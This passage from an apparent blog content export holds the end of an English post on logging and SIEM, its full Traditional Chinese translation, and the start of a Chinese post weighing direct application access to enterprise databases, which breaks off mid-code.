Review effectiveness and expand to another service This incremental approach builds momentum and demonstrates value quickly. Conclusion: Logs as a Strategic Asset Logs are more than debugging tools - they’re strategic assets that provide visibility, security, compliance, and business insights. From simple application logs that help developers troubleshoot issues to sophisticated SIEM systems that detect cyber threats, logs form the foundation of modern system observability. The key to effective logging isn’t collecting everything - it’s collecting the right things, storing them appropriately, and analyzing them intelligently. As systems grow more complex and threats more sophisticated, the ability to extract insights from logs becomes increasingly critical. The future of logging lies in automation and intelligence. AI-powered analysis will detect anomalies humans would miss, automated response systems will contain threats in seconds, and observability platforms will provide unprecedented visibility into system behavior. Organizations that invest in robust logging strategies today will be better positioned to operate securely, efficiently, and compliantly tomorrow. Your logs are already telling you stories about your systems - are you listening? 💭 Final Thought&quot;In God we trust. All others must bring data.&quot; - W. Edwards Deming Logs are your data. They tell the truth about what's really happening in your systems, cutting through assumptions and guesswork to reveal reality. The question isn't whether to invest in logging - it's how quickly you can turn your logs into actionable insights. Additional Resources Logging Frameworks: Log4j - Java logging framework Winston - Node.js logging library Python logging - Built-in Python logging Serilog - .NET structured logging Log Management Platforms: ELK Stack - Elasticsearch, Logstash, Kibana Splunk - Enterprise log management and SIEM Datadog - Cloud monitoring and log management Graylog - Open-source log management SIEM Solutions: IBM QRadar - Enterprise SIEM Azure Sentinel - Cloud-native SIEM AWS Security Hub - AWS security findings aggregation Standards and Best Practices: RFC 5424 - Syslog Protocol OpenTelemetry - Observability framework OWASP Logging Cheat Sheet - Security logging guidance","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"DevOps","slug":"DevOps","permalink":"https://neo01.com/tags/DevOps/"},{"name":"Security","slug":"Security","permalink":"https://neo01.com/tags/Security/"},{"name":"Monitoring","slug":"Monitoring","permalink":"https://neo01.com/tags/Monitoring/"},{"name":"Logging","slug":"Logging","permalink":"https://neo01.com/tags/Logging/"},{"name":"SIEM","slug":"SIEM","permalink":"https://neo01.com/tags/SIEM/"}]},{"title":"理解日誌：系統的沉默守護者","slug":"2023/02/Understanding_Logs_The_Silent_Guardians_of_Your_Systems-zh-TW","date":"un55fin55","updated":"un55fin55","comments":true,"path":"/zh-TW/2020/06/Understanding_Logs_The_Silent_Guardians_of_Your_Systems/","permalink":"https://neo01.com/zh-TW/2020/06/Understanding_Logs_The_Silent_Guardians_of_Your_Systems/","excerpt":"從應用程式日誌到 SIEM——探索不同類型的日誌如何協同運作，保護系統安全、效能與合規。了解何時使用各種日誌類型，以及它們如何形成完整的可觀測性策略。","text":"還記得上次應用程式在正式環境當機嗎？你可能做了每個開發者都會做的事：瘋狂地搜尋日誌檔案，試圖拼湊出問題所在。也許你在數千條 INFO 訊息中找到了一個神秘的錯誤訊息，或者更糟——發現關鍵錯誤根本沒有被記錄。 日誌是我們系統的沉默守護者，持續記錄著幕後發生的一切。但並非所有日誌都是平等的。從追蹤程式碼執行的簡單應用程式日誌，到偵測網路威脅的複雜安全資訊與事件管理（SIEM）系統，日誌的領域廣闊且常被誤解。 從簡單的除錯列印語句開始，已經演變成一個複雜的專業日誌系統生態系統，各自服務於不同的目的。現今的現代基礎設施每秒產生數百萬條日誌記錄，理解該收集哪些日誌、如何儲存它們，以及何時分析它們，可能意味著在幾分鐘內捕捉到安全漏洞，或是幾個月後才發現的差異。 💡 什麼是日誌？日誌是系統、應用程式或網路中發生事件的時間戳記記錄。它們捕捉從例行操作到關鍵錯誤的所有內容，為故障排除、安全分析、合規性和效能優化提供稽核軌跡。 日誌的演進：從列印語句到可觀測性 日誌的開始很簡單。在早期的運算時代，開發者使用列印語句來理解程式碼在做什麼。如果出了問題，你會加入更多列印語句、重新編譯，然後再次執行。這是除錯時代——粗糙但對小型程式有效。 隨著系統變得更複雜，結構化日誌出現了。開發者不再使用隨機的列印語句，而是採用提供嚴重性層級（DEBUG、INFO、WARN、ERROR）、時間戳記和一致格式的日誌框架。這標誌著結構化日誌時代，日誌變得可解析和可搜尋，而不僅僅是人類可讀的文字。 然後出現了分散式系統和微服務。單一使用者請求可能會觸及數十個服務，每個服務都產生自己的日誌。關聯這些日誌變得至關重要，導致了集中式日誌時代。像 ELK Stack（Elasticsearch、Logstash、Kibana）和 Splunk 這樣的工具出現，用於聚合、搜尋和視覺化來自多個來源的日誌。 今天，我們處於可觀測性時代。日誌只是可觀測性的一個支柱，與指標和追蹤一起工作，提供完整的系統可見性。現代平台將日誌與效能指標、分散式追蹤和安全事件關聯起來，為團隊提供前所未有的系統行為洞察。 timeline title 日誌的演進 1960s-1980s : 除錯時代 : 列印語句和主控台輸出 : 手動日誌審查 1990s-2000s : 結構化日誌時代 : 日誌框架（log4j、syslog） : 嚴重性層級和格式化 2000s-2010s : 集中式日誌時代 : 日誌聚合平台 : ELK Stack、Splunk 2010s-Present : 可觀測性時代 : 日誌 + 指標 + 追蹤 : AI 驅動的分析 : 即時關聯 日誌類型：全面的分類 理解不同類型的日誌及其目的，對於建構強健的系統至關重要。讓我們探索主要類別以及何時使用每一種。 應用程式日誌 應用程式日誌記錄軟體程式碼中的事件——函式呼叫、變數值、業務邏輯執行和錯誤。這些是開發者最常互動的日誌。 它們捕捉什麼： 函式進入和退出點 關鍵時刻的變數值 業務邏輯決策（例如，「使用者符合折扣資格」） 例外和錯誤堆疊追蹤 操作的效能計時 常見嚴重性層級： TRACE：極其詳細的資訊，通常僅在開發期間啟用 DEBUG：對診斷問題有用的詳細資訊 INFO：關於應用程式流程的一般資訊訊息 WARN：可能有害但尚未成為錯誤的情況 ERROR：可能仍允許應用程式繼續的錯誤事件 FATAL：導致應用程式終止的嚴重錯誤 最佳實踐： 使用結構化日誌格式（JSON）以便更容易解析 包含關聯 ID 以追蹤跨服務的請求 避免記錄敏感資料（密碼、信用卡、個人識別資訊） 為不同環境設定適當的日誌層級（開發環境用 DEBUG，正式環境用 INFO） 實施日誌輪替以防止磁碟空間耗盡 🎬 真實世界的應用程式日誌{ &quot;timestamp&quot;: &quot;2020-06-15T14:32:18.123Z&quot;, &quot;level&quot;: &quot;ERROR&quot;, &quot;service&quot;: &quot;payment-service&quot;, &quot;correlationId&quot;: &quot;abc-123-def-456&quot;, &quot;message&quot;: &quot;Payment processing failed&quot;, &quot;error&quot;: &quot;Gateway timeout&quot;, &quot;userId&quot;: &quot;user_789&quot;, &quot;amount&quot;: 99.99, &quot;stackTrace&quot;: &quot;...&quot; &#125; 這種結構化格式使得搜尋與特定使用者、關聯 ID 或錯誤類型相關的所有錯誤變得容易。 系統日誌 系統日誌捕捉作業系統和基礎設施事件——伺服器啟動、硬體故障、核心訊息和系統服務狀態變更。 它們捕捉什麼： 開機和關機事件 硬體錯誤（磁碟故障、記憶體問題） 核心訊息和驅動程式事件 系統服務狀態（已啟動、已停止、失敗） 資源耗盡警告 常見系統日誌類型： syslog：Unix/Linux 標準日誌協定 Windows 事件日誌：Windows 系統事件記錄 journald：現代 Linux 日誌系統（systemd） dmesg：核心環形緩衝區訊息 為什麼它們重要： 系統日誌通常提供硬體故障、安全漏洞或設定問題的早期警告訊號。磁碟錯誤的突然激增可能預測即將發生的磁碟機故障，而異常的身份驗證嘗試可能表示暴力攻擊。 安全日誌 安全日誌追蹤身份驗證、授權和安全相關事件。這些對於偵測漏洞、調查事件和滿足合規要求至關重要。 它們捕捉什麼： 登入嘗試（成功和失敗） 權限變更和權限提升 防火牆允許/拒絕決策 入侵偵測系統（IDS）警報 資料存取和修改事件 安全政策違規 關鍵安全日誌來源： 身份驗證日誌：誰登入、何時以及從哪裡 防火牆日誌：允許或封鎖的網路流量 IDS/IPS 日誌：偵測到的入侵嘗試 防毒日誌：惡意軟體偵測和隔離事件 VPN 日誌：遠端存取連線 資料庫稽核日誌：敏感資料存取 合規要求： 許多法規要求保留安全日誌： PCI DSS：90 天線上，1 年封存（支付卡資料） HIPAA：6 年（醫療保健資料） SOX：7 年（財務記錄） GDPR：依目的和法律依據而異 ⚠️ 安全日誌最佳實踐 保護日誌完整性：將日誌儲存在獨立系統上，以防止攻擊者掩蓋其蹤跡 即時監控：不要等到每月審查才偵測漏洞 關聯事件：單次登入失敗是正常的；一分鐘內 1000 次就是攻擊 加密敏感日誌：日誌可能包含敏感資訊 實施篡改偵測：使用加密雜湊來偵測日誌修改 稽核日誌 稽核日誌提供詳細、不可變的記錄，記載誰做了什麼、何時以及在哪裡。與一般應用程式日誌不同，稽核日誌專門設計用於合規性、鑑識和問責制。 它們捕捉什麼： 使用者操作（建立、讀取、更新、刪除） 管理變更（設定、權限） 資料存取和修改 系統設定變更 政策違規 關鍵特徵： 不可變：一旦寫入，稽核日誌永遠不應被修改或刪除 全面：捕捉所有相關背景（誰、什麼、何時、哪裡、為什麼） 防篡改：使用加密技術偵測修改 長期保留：通常保留數年以滿足合規要求 稽核日誌 vs 應用程式日誌： 面向 應用程式日誌 稽核日誌 目的 除錯、故障排除 合規性、問責制 受眾 開發者、維運人員 稽核員、法務、安全 保留期 數天到數週 數月到數年 可變性 可以輪替/刪除 不可變 詳細程度 技術細節 業務操作 🎯 稽核日誌範例{ &quot;timestamp&quot;: &quot;2020-06-15T14:32:18.123Z&quot;, &quot;actor&quot;: &#123; &quot;userId&quot;: &quot;admin_123&quot;, &quot;ipAddress&quot;: &quot;192.168.1.100&quot;, &quot;userAgent&quot;: &quot;Mozilla&#x2F;5.0...&quot; &#125;, &quot;action&quot;: &quot;DELETE&quot;, &quot;resource&quot;: &#123; &quot;type&quot;: &quot;customer_record&quot;, &quot;id&quot;: &quot;cust_456&quot;, &quot;name&quot;: &quot;John Doe&quot; &#125;, &quot;result&quot;: &quot;SUCCESS&quot;, &quot;reason&quot;: &quot;Customer requested data deletion (GDPR)&quot;, &quot;signature&quot;: &quot;a3f5b8c9d2e1...&quot; &#125; 存取日誌 存取日誌記錄對網頁伺服器、API 和其他網路服務的請求。它們對於理解流量模式、偵測攻擊和故障排除連線問題至關重要。 它們捕捉什麼： HTTP 請求（方法、URL、狀態碼） 客戶端資訊（IP 位址、使用者代理） 回應大小和計時 參照來源和身份驗證詳細資訊 常見格式： Apache Combined Log Format：標準網頁伺服器格式 NGINX 存取日誌：類似 Apache，具有自訂選項 AWS CloudFront 日誌：CDN 存取日誌 API Gateway 日誌：API 請求/回應詳細資訊 使用案例： 流量分析：理解使用者行為和熱門內容 效能監控：識別緩慢的端點 安全偵測：發現 SQL 注入、XSS 嘗試、機器人流量 容量規劃：根據流量趨勢預測基礎設施需求 效能日誌 效能日誌追蹤系統和應用程式效能指標——回應時間、資源使用率、吞吐量和瓶頸。 它們捕捉什麼： 請求/回應延遲 資料庫查詢執行時間 CPU、記憶體、磁碟、網路使用率 執行緒池和連線池指標 快取命中/未命中率 垃圾回收事件 為什麼它們重要： 效能日誌有助於在影響使用者之前識別瓶頸。資料庫查詢時間的逐漸增加可能表示缺少索引或資料量增長需要優化。 graph TB A([👤 使用者請求]) --> B([🌐 負載平衡器存取日誌]) B --> C([🖥️ 網頁伺服器應用程式日誌]) C --> D([💾 資料庫查詢日誌]) D --> C C --> E([📊 效能日誌回應時間：250ms]) C --> B B --> A F([🔍 監控系統]) -.收集.-> B F -.收集.-> C F -.收集.-> D F -.收集.-> E style A fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style E fill:#fff3e0,stroke:#f57c00,stroke-width:2px style F fill:#e8f5e9,stroke:#388e3c,stroke-width:2px 交易日誌 交易日誌記錄資料庫操作，確保資料完整性並在故障後啟用復原。這些對於維護資料庫的 ACID 屬性至關重要。 它們捕捉什麼： 資料庫交易（BEGIN、COMMIT、ROLLBACK） 資料修改（INSERT、UPDATE、DELETE） 結構描述變更（CREATE、ALTER、DROP） 檢查點和復原資訊 關鍵功能： 當機復原：在系統故障後重播已提交的交易 時間點復原：將資料庫還原到特定時刻 複寫：將變更傳播到副本資料庫 稽核軌跡：追蹤所有資料修改 特定資料庫範例： MySQL Binary Log：複寫和時間點復原 PostgreSQL WAL：預寫式日誌以確保持久性 Oracle Redo Log：交易復原和複寫 MongoDB Oplog：副本集的操作日誌 SIEM：安全的中樞神經系統 安全資訊與事件管理（SIEM）系統代表日誌分析的巔峰，關聯來自多個來源的資料以偵測威脅、調查事件並確保合規性。 什麼是 SIEM？ SIEM 平台聚合來自整個基礎設施的日誌——防火牆、伺服器、應用程式、資料庫、雲端服務——並應用進階分析來即時偵測安全威脅。 核心能力： 日誌聚合：從不同格式的多樣來源收集日誌，並將它們標準化為通用結構描述以進行分析。 即時關聯：應用規則來偵測多個日誌來源的模式。例如，關聯存取日誌中的失敗登入嘗試與防火牆封鎖和 IDS 警報，以識別協同攻擊。 威脅偵測：使用簽章、行為分析和機器學習來識別已知和未知的威脅。 事件調查：提供搜尋和視覺化工具來調查安全事件、追蹤攻擊路徑並理解影響。 合規報告：產生報告，證明符合 PCI DSS、HIPAA、SOX 和 GDPR 等法規。 警報和回應：在偵測到威脅時觸發警報，並與安全編排工具整合以進行自動回應。 SIEM 如何運作 graph TB A([🖥️ 伺服器]) --> E([📥 SIEM 平台]) B([🔥 防火牆]) --> E C([💻 應用程式]) --> E D([☁️ 雲端服務]) --> E E --> F([🔄 標準化與豐富化]) F --> G([🧠 關聯引擎]) G --> H{🚨 偵測到威脅？} H -->|是| I([📢 警報安全團隊]) H -->|否| J([📊 儲存以供分析]) I --> K([🔍 調查與回應]) style E fill:#e3f2fd,stroke:#1976d2,stroke-width:3px style G fill:#fff3e0,stroke:#f57c00,stroke-width:2px style I fill:#ffebee,stroke:#c62828,stroke-width:2px style K fill:#e8f5e9,stroke:#388e3c,stroke-width:2px SIEM 使用案例 偵測暴力攻擊：關聯來自同一 IP 的多次失敗登入嘗試跨不同系統，當超過閾值時觸發警報。 識別內部威脅：偵測異常的資料存取模式，例如員工在正常工作時間外下載大量客戶資料。 合規監控：持續監控政策違規，並產生稽核報告證明符合法規要求。 事件回應：當發生漏洞時，快速搜尋所有日誌以理解攻擊時間軸、受影響的系統和資料暴露。 威脅狩獵：主動搜尋歷史日誌中的入侵指標（IOC），以識別先前未偵測到的漏洞。 熱門 SIEM 平台 Splunk：市場領導者，具有強大的搜尋能力和廣泛的整合。以靈活性著稱，但大規模使用可能昂貴。 IBM QRadar：強大的關聯引擎和威脅情報整合。在企業環境中很受歡迎。 ArcSight：長期建立的平台，具有強健的合規功能。對大型組織來說複雜但強大。 Elastic Security（ELK Stack）：開源選項，結合 Elasticsearch、Logstash 和 Kibana 與安全分析。對具有技術專業知識的組織來說具成本效益。 Azure Sentinel：雲端原生 SIEM，具有 AI 驅動的威脅偵測。與 Microsoft 生態系統無縫整合。 AWS Security Hub：聚合來自 AWS 服務和第三方工具的安全發現。最適合以 AWS 為中心的環境。 📝 SIEM vs 日誌管理日誌管理專注於收集、儲存和搜尋日誌以進行故障排除和分析。 SIEM 增加了安全特定能力：威脅偵測、關聯、合規報告和事件回應。 將日誌管理視為基礎，SIEM 視為建立在其上的安全情報層。 建構全面的日誌策略 有效的日誌記錄不是收集所有東西——而是收集正確的東西並知道如何使用它們。以下是如何建構平衡可見性、成本和合規性的日誌策略。 定義您的日誌需求 識別利害關係人：不同團隊需要不同的日誌： 開發者：用於除錯的應用程式日誌 維運人員：用於故障排除的系統和效能日誌 安全人員：用於威脅偵測的安全和稽核日誌 合規人員：用於法規要求的稽核日誌 業務人員：用於分析的交易日誌 確定保留期限：平衡儲存成本與合規和營運需求： 熱儲存（快速、昂貴）：用於主動故障排除的最近日誌（7-30 天） 溫儲存（中等）：用於調查的歷史日誌（30-90 天） 冷儲存（慢速、便宜）：用於合規的封存日誌（1-7 年） 實施結構化日誌 在所有系統中使用一致、可解析的格式： JSON 格式：機器可讀且人類友善 &#123; &quot;timestamp&quot;: &quot;2020-06-15T14:32:18.123Z&quot;, &quot;level&quot;: &quot;ERROR&quot;, &quot;service&quot;: &quot;payment-service&quot;, &quot;message&quot;: &quot;Payment failed&quot;, &quot;context&quot;: &#123; &quot;userId&quot;: &quot;user_789&quot;, &quot;orderId&quot;: &quot;order_456&quot;, &quot;amount&quot;: 99.99 &#125; &#125; 包含必要欄位： 時間戳記：ISO 8601 格式含時區 嚴重性：跨服務的一致層級 服務/元件：哪個系統產生了日誌 關聯 ID：追蹤跨服務的請求 背景：相關的業務和技術細節 集中日誌收集 不要讓日誌散落在各個伺服器上： 日誌傳送：使用代理程式（Filebeat、Fluentd、Logstash）將日誌轉發到中央儲存。 直接整合：設定應用程式透過 API 直接將日誌傳送到集中式平台。 雲端原生選項：對雲端工作負載使用雲端供應商的日誌服務（CloudWatch、Stackdriver、Azure Monitor）。 實施日誌分析 即時監控：為關鍵事件設定儀表板和警報： 錯誤率激增 安全異常 效能下降 系統故障 定期審查：安排定期日誌審查以識別趨勢和問題： 每週：審查錯誤模式和效能趨勢 每月：分析安全事件和合規狀態 每季：評估日誌策略有效性 自動化分析：使用機器學習來偵測人類可能錯過的異常和模式。 保護您的日誌 加密：加密傳輸中和靜態的日誌以保護敏感資訊。 存取控制：根據角色和需知原則限制日誌存取。 完整性保護：使用加密雜湊或區塊鏈技術來偵測篡改。 獨立儲存：將安全日誌儲存在獨立系統上，以防止攻擊者掩蓋其蹤跡。 ⚠️ 常見日誌錯誤 記錄太多：過度日誌記錄會產生雜訊並增加成本 記錄太少：遺漏關鍵事件使故障排除變得不可能 記錄敏感資料：個人識別資訊、密碼和機密永遠不應被記錄 忽略日誌輪替：未輪替的日誌可能填滿磁碟並使系統當機 沒有集中化：分散的日誌使關聯和分析變得困難 忘記合規性：不充分的保留可能導致法規處罰 日誌分析技術 收集日誌只是戰鬥的一半——提取洞察需要有效的分析技術。 搜尋和過濾 基本搜尋：使用關鍵字、錯誤代碼或識別碼尋找特定事件。 進階查詢：使用查詢語言（Lucene、KQL、SPL）進行複雜搜尋： 尋找過去一小時內來自特定服務的所有錯誤 識別回應時間超過 5 秒的請求 定位來自特定 IP 範圍的所有失敗登入嘗試 聚合和統計 計數和分組：聚合日誌以識別模式： 按類型計算錯誤 按端點分組請求 計算平均回應時間 時間序列分析：追蹤隨時間變化的指標以識別趨勢： 過去一週錯誤率增加 按一天中的小時劃分的流量模式 系統負載的季節性變化 關聯 跨來源關聯：連接不同日誌來源的事件： 將應用程式錯誤連結到基礎設施問題 關聯多個系統的安全事件 追蹤跨微服務的使用者旅程 時間關聯：識別在時間上一起發生的事件： 失敗登入後成功登入（憑證填充） 資料庫減速與批次作業執行同時發生 部署期間的網路延遲激增 視覺化 儀表板：建立系統健康和關鍵指標的即時視圖。 圖表和圖形：視覺化趨勢、分佈和異常： 時間序列資料的折線圖 比較的長條圖 模式偵測的熱圖 分佈分析的圓餅圖 警報：根據閾值、異常或特定模式設定警報。 graph LR A([📊 原始日誌]) --> B([🔍 搜尋與過濾]) B --> C([📈 聚合與分析]) C --> D([🔗 關聯事件]) D --> E([📉 視覺化與警報]) E --> F([💡 洞察與行動]) style A fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px style E fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style F fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px 日誌的未來：AI 與自動化 日誌領域持續演進，人工智慧和自動化正在改變我們收集、分析和處理日誌資料的方式。 AI 驅動的日誌分析 異常偵測：機器學習模型在沒有預定義規則的情況下識別異常模式： 偵測沒有已知簽章的零日攻擊 在影響使用者之前識別效能下降 根據行為變化發現內部威脅 自動化根本原因分析：AI 關聯日誌、指標和追蹤以自動識別問題的根本原因，將平均解決時間（MTTR）從數小時縮短到數分鐘。 預測分析：分析歷史模式以預測未來問題： 根據流量趨勢預測容量需求 在硬體故障發生前預測 根據新興模式預測安全威脅 可觀測性平台 現代可觀測性平台將日誌與指標和分散式追蹤整合，提供完整的系統可見性： 統一視圖：在單一介面中查看日誌、指標和追蹤，使理解系統行為變得更容易。 自動關聯：平台自動連結相關的日誌、指標和追蹤，消除手動關聯工作。 背景感知分析：AI 理解服務之間的關係，自動識別依賴關係和影響。 自動化回應 自我修復系統：自動回應偵測到的問題： 重新啟動失敗的服務 根據負載擴展資源 封鎖惡意 IP 位址 回滾有問題的部署 安全編排：將 SIEM 與安全編排、自動化和回應（SOAR）平台整合，以自動遏制威脅。 🔮 新興趨勢 基於 eBPF 的日誌記錄：核心層級的可觀測性，開銷最小 OpenTelemetry：日誌、指標和追蹤的供應商中立標準 邊緣日誌記錄：在邊緣處理日誌以減少頻寬和延遲 隱私保護日誌記錄：在保護使用者隱私的同時記錄有用資訊的技術 基於區塊鏈的稽核日誌：不可變、防篡改的稽核軌跡 入門：實用步驟 準備好改善您的日誌策略了嗎？這裡有一個實用的路線圖： 步驟 1：稽核您目前的日誌記錄 清點：列出所有產生日誌的系統、應用程式和服務。 評估涵蓋範圍：識別未記錄關鍵事件的缺口。 審查保留期：確保保留期限符合合規和營運需求。 評估成本：理解目前的日誌成本並識別優化機會。 步驟 2：實施結構化日誌 選擇格式：標準化使用 JSON 或其他結構化格式。 定義結構描述：在服務之間建立一致的欄位名稱和資料類型。 新增背景：包含關聯 ID、使用者 ID 和其他背景資訊。 更新應用程式：逐步從非結構化遷移到結構化日誌。 步驟 3：集中日誌收集 選擇平台：根據您的需求和預算選擇日誌管理或 SIEM 平台。 部署代理程式：在所有系統上安裝日誌傳送代理程式。 設定轉發：從應用程式和服務設定日誌轉發。 測試和驗證：確保日誌正確流動並被正確解析。 步驟 4：建立儀表板和警報 識別關鍵指標：確定哪些指標對您的系統最重要。 建構儀表板：建立系統健康和效能的即時視圖。 設定警報：為關鍵事件和異常設定通知。 建立操作手冊：記錄常見警報的回應程序。 步驟 5：培訓您的團隊 開發者培訓：教導開發者有效記錄什麼和如何記錄。 維運培訓：培訓維運團隊進行日誌分析和故障排除。 安全培訓：確保安全團隊能夠使用 SIEM 進行威脅偵測和調查。 定期審查：安排定期審查以評估日誌有效性並識別改進。 🎯 快速成功：從小處著手不要試圖一次實施所有東西。從以下開始： 第 1 週：在一個關鍵服務中實施結構化日誌 第 2 週：為該服務設定集中收集 第 3 週：建立基本儀表板和一個關鍵警報 第 4 週：審查有效性並擴展到另一個服務 這種漸進式方法建立動力並快速展示價值。 結論：日誌作為策略資產 日誌不僅僅是除錯工具——它們是提供可見性、安全性、合規性和業務洞察的策略資產。從幫助開發者排除問題的簡單應用程式日誌，到偵測網路威脅的複雜 SIEM 系統，日誌構成了現代系統可觀測性的基礎。 有效日誌記錄的關鍵不是收集所有東西——而是收集正確的東西、適當地儲存它們，並智慧地分析它們。隨著系統變得更複雜，威脅變得更複雜，從日誌中提取洞察的能力變得越來越關鍵。 日誌的未來在於自動化和智慧。AI 驅動的分析將偵測人類會錯過的異常，自動化回應系統將在幾秒鐘內遏制威脅，可觀測性平台將提供前所未有的系統行為可見性。今天投資於強健日誌策略的組織，將更有能力在明天安全、高效且合規地運作。 您的日誌已經在告訴您關於系統的故事——您在聆聽嗎？ 💭 最後的想法「我們信任上帝。其他所有人都必須帶來資料。」—— W. Edwards Deming 日誌就是您的資料。它們告訴您系統中真正發生的事情，穿透假設和猜測以揭示現實。問題不是是否要投資於日誌記錄——而是您能多快將日誌轉化為可行的洞察。 其他資源 日誌框架： Log4j - Java 日誌框架 Winston - Node.js 日誌函式庫 Python logging - 內建 Python 日誌 Serilog - .NET 結構化日誌 日誌管理平台： ELK Stack - Elasticsearch、Logstash、Kibana Splunk - 企業日誌管理和 SIEM Datadog - 雲端監控和日誌管理 Graylog - 開源日誌管理 SIEM 解決方案： IBM QRadar - 企業 SIEM Azure Sentinel - 雲端原生 SIEM AWS Security Hub - AWS 安全發現聚合 標準和最佳實踐： RFC 5424 - Syslog 協定 OpenTelemetry - 可觀測性框架 OWASP Logging Cheat Sheet - 安全日誌指南","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"DevOps","slug":"DevOps","permalink":"https://neo01.com/tags/DevOps/"},{"name":"Security","slug":"Security","permalink":"https://neo01.com/tags/Security/"},{"name":"Monitoring","slug":"Monitoring","permalink":"https://neo01.com/tags/Monitoring/"},{"name":"Logging","slug":"Logging","permalink":"https://neo01.com/tags/Logging/"},{"name":"SIEM","slug":"SIEM","permalink":"https://neo01.com/tags/SIEM/"}],"lang":"zh-TW"},{"title":"企業中資料庫是否應允許應用程式直接連接？","slug":"2023/01/Database-Direct-Access-zh-TW","date":"un55fin55","updated":"un00fin00","comments":false,"path":"/zh-TW/2023/01/Database-Direct-Access/","permalink":"https://neo01.com/zh-TW/2023/01/Database-Direct-Access/","excerpt":"多個應用程式直接連接到你的資料庫——方便還是災難？探索為什麼企業架構師會爭論這個基本設計決策。","text":"你的 CRM 需要客戶資料。你的分析儀表板需要相同的資料。你的行動應用程式也需要它。資料庫擁有一切。為什麼不讓它們全部直接連接？ 這似乎合乎邏輯。但在企業架構中，這個簡單的決定可能會成就或破壞你系統的可擴展性、安全性和可維護性。 問題 在企業環境中，多個應用程式是否應該直接連接到資料庫？ 簡短回答：視情況而定——但通常不應該。 詳細回答：讓我們探討兩方面。 支持直接資料庫存取的理由 優勢 1. 簡單性 flowchart LR App1[\"📱 行動應用程式\"] --> DB[(\"🗄️ 資料庫\")] App2[\"💻 Web 應用程式\"] --> DB App3[\"📊 分析\"] --> DB style DB fill:#e3f2fd 更少的移動部件 無需維護中介軟體 直接的開發 快速原型製作 2. 效能 直接連接消除了中間層： 直接：應用程式 → 資料庫（1 跳） API 層：應用程式 → API → 資料庫（2 跳） 更低的延遲 更少的網路呼叫 無序列化開銷 3. 即時資料 應用程式總是看到最新的資料： 無快取失效問題 無同步延遲 立即一致性 4. 開發速度 開發人員可以： 查詢他們需要的確切內容 快速迭代 直接使用資料庫功能（預存程序、觸發器） 何時有意義 小型組織： 2-3 個應用程式 單一開發團隊 低流量 預算緊張 內部工具： 管理儀表板 報表工具 資料分析腳本 一次性工具 原型： MVP 開發 概念驗證 快速實驗 反對直接資料庫存取的理由 問題 1. 安全噩夢 **問題：**每個應用程式都需要資料庫憑證。 flowchart TD subgraph \"安全風險\" App1[\"📱 行動應用程式(程式碼中的資料庫憑證)\"] App2[\"💻 Web 應用程式(配置中的資料庫憑證)\"] App3[\"📊 分析(暴露的資料庫憑證)\"] App4[\"🔧 管理工具(完整資料庫存取)\"] end App1 --> DB[(\"🗄️ 資料庫⚠️ 單點妥協\")] App2 --> DB App3 --> DB App4 --> DB style DB fill:#ffebee 風險： **憑證擴散：**多個程式碼庫中的密碼 **行動應用程式：**可以從 APK/IPA 提取憑證 **第三方存取：**難以撤銷特定應用程式存取 **稽核噩夢：**無法追蹤哪個應用程式進行了哪個查詢 真實世界範例： 行動應用程式反編譯 → 提取資料庫密碼 → 攻擊者擁有完整資料庫存取權限 → 所有客戶資料被洩露 2. 緊密耦合 **問題：**應用程式直接依賴資料庫架構。 架構變更影響： -- 重新命名欄位 ALTER TABLE users RENAME COLUMN email TO email_address; 結果： ❌ 行動應用程式中斷 ❌ Web 應用程式中斷 ❌ 分析中斷 ❌ 管理工具中斷 ❌ 所有都需要同時更新 部署噩夢： 資料庫遷移 → 必須同時部署所有應用程式 → 需要協調停機時間 → 失敗風險高 3. 無業務邏輯層 **問題：**業務規則分散在各個應用程式中。 範例：折扣計算 行動應用程式：10% 折扣邏輯 Web 應用程式：15% 折扣邏輯（過時） 分析：無折扣邏輯（錯誤報表） 後果： 不一致的行為 重複的程式碼 難以維護 難以稽核 預存程序如何？ 有些人認為：「將業務邏輯放在預存程序中——問題解決！」 預存程序方法： -- 資料庫中的集中式折扣邏輯 CREATE PROCEDURE calculate_order_total( IN user_id INT, IN order_id INT, OUT final_total DECIMAL(10,2) ) BEGIN DECLARE base_total DECIMAL(10,2); DECLARE discount DECIMAL(10,2); DECLARE is_premium BOOLEAN; SELECT total INTO base_total FROM orders WHERE id &#x3D; order_id; SELECT premium INTO is_premium FROM users WHERE id &#x3D; user_id; IF is_premium THEN SET discount &#x3D; base_total * 0.15; ELSEIF base_total &gt; 100 THEN SET discount &#x3D; base_total * 0.10; ELSE SET discount &#x3D; 0; END IF; SET final_total &#x3D; base_total - discount; END; 優勢： ✅ 邏輯集中在一個地方 ✅ 所有應用程式使用相同的計算 ✅ 保證一致的行為 ✅ 效能（在資料附近執行） 但嚴重的缺點： 1. 有限的語言功能： -- SQL&#x2F;PL-SQL 不是為複雜邏輯設計的 -- 沒有現代語言功能： -- - 無依賴注入 -- - 有限的錯誤處理 -- - 無單元測試框架 -- - 無 IDE 支援（與 Java&#x2F;Python&#x2F;Node.js 相比） 2. 難以測試： &#x2F;&#x2F; 應用程式程式碼 - 易於測試 function calculateDiscount(user, order) &#123; if (user.isPremium) return order.total * 0.15; return order.total &gt; 100 ? order.total * 0.10 : 0; &#125; &#x2F;&#x2F; 單元測試 test(&#39;premium user gets 15% discount&#39;, () &#x3D;&gt; &#123; const user &#x3D; &#123; isPremium: true &#125;; const order &#x3D; &#123; total: 100 &#125;; expect(calculateDiscount(user, order)).toBe(15); &#125;); -- 預存程序 - 難以測試 -- 需要資料庫連接 -- 需要測試資料設置 -- 測試執行緩慢 -- 無模擬&#x2F;存根 3. 供應商鎖定： Oracle PL&#x2F;SQL ≠ SQL Server T-SQL ≠ PostgreSQL PL&#x2F;pgSQL -- 遷移資料庫意味著重寫所有程序 -- 不同的語法、功能、限制 4. 部署複雜性： 應用程式部署： - Git 提交 → CI&#x2F;CD → 部署 → 回滾容易 預存程序部署： - 手動 SQL 腳本 - 版本控制困難 - 回滾有風險 - 無法與應用程式程式碼原子部署 5. 有限的可觀察性： &#x2F;&#x2F; 應用程式程式碼 - 完整的可觀察性 function processOrder(order) &#123; logger.info(&#39;Processing order&#39;, &#123; orderId: order.id &#125;); const discount &#x3D; calculateDiscount(order); 